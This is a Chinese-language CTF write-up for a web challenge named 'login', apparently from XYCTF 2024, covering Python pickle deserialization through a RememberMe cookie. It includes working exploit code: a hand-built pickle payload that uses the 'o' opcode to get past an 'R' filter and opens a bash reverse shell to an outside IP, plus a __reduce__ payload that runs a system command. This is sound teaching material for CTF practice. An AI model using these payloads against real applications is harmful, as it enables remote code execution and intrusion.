# login

> 分类：Web

## 题目描述
Python Pickle 反序列化题。先注册账号再登录，响应头 Set-Cookie 有 `RememberMe` 字段（base64 后可见 `app`/`Login` 等，是 pickle 序列化数据）。存在过滤（ban `R`/`r`），需用 o 字节码绕过，反弹 shell 拿 flag。

## 考察知识点
- Pickle 反序列化
- o 字节码 / opcode 绕过过滤
- 反弹 shell

## 解法
1. 访问 `./register.php` 注册账号，登录后抓包看到 `RememberMe` cookie。
2. base64 解码可见 pickle 序列化结构，确定是 Pickle 反序列化。
3. 存在过滤，`__reduce__` 的 `R` 被 ban，用 `o`（`cos`/`system`）字节码绕过。

exp：
```python
import base64

shell = b'''bash -c "bash -i >& /dev/tcp/124.222.136.33/1337 0<&1"'''

payload = b'''(cos
system
V''' + shell + b'''
o.'''

print(base64.b64encode(payload).decode())
```

也可直接拼接 pickle 数据（去掉原数据末尾的 `.` 后接 payload）：
```python
import pickle, base64
class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('cat /flag')",))
print(base64.b64encode(pickle.dumps(A())))
```

将生成的 payload 打回 cookie 的 `RememberMe` 中，监听反弹 shell 拿 flag。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
